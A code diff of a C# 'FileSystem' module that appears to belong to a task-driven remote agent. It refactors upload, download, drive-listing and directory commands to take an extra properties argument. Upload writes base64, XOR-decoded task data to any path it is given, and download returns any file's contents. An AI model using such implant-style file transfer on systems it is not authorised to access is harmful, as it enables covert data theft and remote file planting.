@@ -1,10 +1,6 @@
 ﻿using System;
-using System.Collections.Generic;
 using System.IO;
-using System.Linq;
-using System.Security.Principal;
 using System.Text;
-using System.Threading.Tasks;
 using Dots.Models;
 
 namespace FileSystem
@@ -15,7 +11,7 @@ namespace FileSystem
     {
         public override string Name => "upload";
 
-        public override void Execute(TaskRequest task)
+        public override void Execute(TaskRequest task, DotsProperties dotsProperty)
         {
             byte[] upstream_data = Zor(Convert.FromBase64String(task.Params[0]), task.Params[1]);
             string upload_path = task.Params[2];
@@ -28,7 +24,7 @@ namespace FileSystem
     {
         public override string Name => "download";
 
-        public override void Execute(TaskRequest task)
+        public override void Execute(TaskRequest task, DotsProperties dotsProperty)
         {
             string download_path = task.Params[0];
             SetupResult(task, File.ReadAllBytes(download_path));
@@ -63,7 +59,7 @@ namespace FileSystem
             return result.ToString();
         }
 
-        public override void Execute(TaskRequest task)
+        public override void Execute(TaskRequest task, DotsProperties dotsProperty)
         {
             SetupResult(task, Drives());
         }
@@ -72,6 +68,11 @@ namespace FileSystem
     public class DirCommand : DotsCommand
     {
         public override string Name => "dir";
+
+        public override void Execute(TaskRequest task, DotsProperties dotsProperty)  
+        {
+            SetupResult(task, Dir(task.Params));
+        }
 
         private static string Dir(string[] args)
         {
@@ -105,11 +106,6 @@ namespace FileSystem
             }
 
             return result.ToString();
-        }
-
-        public override void Execute(TaskRequest task)
-        {
-            SetupResult(task, Dir(task.Params));
         }
     }
 }
